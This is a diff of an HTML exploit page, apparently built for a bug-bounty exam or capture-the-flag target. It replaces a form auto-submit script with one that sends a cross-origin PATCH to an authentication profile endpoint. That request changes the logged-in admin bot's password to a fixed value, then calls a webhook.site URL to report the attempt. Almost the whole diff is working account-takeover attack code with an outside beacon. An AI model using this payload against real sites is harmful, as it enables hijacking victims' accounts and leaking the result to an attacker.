@@ -7,17 +7,19 @@
     </form>
 
     <script>
-        const webhook = "https://webhook.site/841a65c5-0695-459d-80da-91ae7613c283";
-        
-        // 1. Log that we are launching the final form attack
-        fetch(webhook + "?status=launching_form_ato");
-
-        // 2. We use a trick: some APIs allow _method=PATCH in a POST request
-        // or just accept the POST to the profile endpoint.
-        // We submit the form after a tiny delay
-        setTimeout(() => {
-            document.getElementById('exploitForm').submit();
-        }, 500);
-    </script>
+    const target = "https://api-bugbounty-exam.hashacademy.co/api/auth/profile";
+    
+    // We try to change the password for the currently logged-in AdminBot
+    fetch(target, {
+        method: "PATCH",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            "password": "Password1337!",
+            "confirmPassword": "Password1337!"
+        })
+    }).then(() => {
+        fetch("https://webhook.site/841a65c5-0695-459d-80da-91ae7613c283?status=password_change_attempted");
+    });
+</script>
 </body>
 </html>
